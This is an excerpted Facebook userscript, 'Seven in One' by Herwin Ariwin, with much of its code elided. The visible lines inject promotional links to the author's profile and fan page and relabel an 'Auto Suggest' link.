// ==UserScript==
// @name            Seven in One By @HerwinAriwin
// @description     All about facebook By Herwin Ariwin
...
if(body != null) {
	...
	div.innerHTML = "<center><a href='http://www.facebook.com/100005694192805'><img src='http://m.uploadedit.com/b018/1375198514954.gif' alt='Loading...' width=120 hight=90></a></center><br><br></br>"
	...
	for(i=1;i<=20;i++) {
		...
		div2.innerHTML = "<center><a onclick='spoiler()' title='Click to Hidden Widget'>&laquo;</a> &#8226; <a href='http://www.facebook.com/556102874448098' title='Thanks for install this script'>My FansPage</a></center> "
		}
		else {
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/100005694192805" target="_blank">Created by Herwin Ariwin <br>KLIK DISINI</a>';
	html += '</div>';
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Herwin Ariwin';
